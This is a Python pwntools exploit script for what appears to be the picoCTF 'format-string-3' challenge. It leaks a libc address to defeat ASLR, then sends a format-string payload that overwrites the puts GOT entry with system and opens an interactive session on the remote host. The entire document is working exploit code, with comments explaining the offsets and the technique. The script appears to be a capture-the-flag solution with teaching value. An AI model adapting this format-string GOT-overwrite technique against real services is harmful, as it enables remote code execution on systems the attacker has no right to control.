from pwn import *

context(arch="amd64", os="linux")
elf = ELF("./format-string-3") 
libc = ELF("./libc.so.6")

r = remote("rhea.picoctf.net", 62523)

r.recvuntil(b": 0x") 

aslred_setvbuf = r.recv(12) #The address of setvbuf in the process
print(aslred_setvbuf)

static_setvbuf = libc.symbols['setvbuf'] #The address of setvbuf in the libc binary which is constant
print(static_setvbuf)

aslred_setvbuf = int(aslred_setvbuf, 16) 
libc.address = aslred_setvbuf - static_setvbuf 
print(libc.address)
#If setvbuf is at 0x7ffff7e02a00 and its offset in libc is 0x02a00, then the
#base address of libc is 0x7ffff7e02a00 - 0x02a00 = 0x7ffff7e00000
#This sets the offset of libc in the above libc variable

#38 is the offset at which the format string is stored in the stack. I used gdb to find that
r.sendline(fmtstr_payload(38, {elf.got['puts']: libc.symbols['system']}))
# constructs a format string payload which replaces the address of puts to system in the got table
r.interactive()
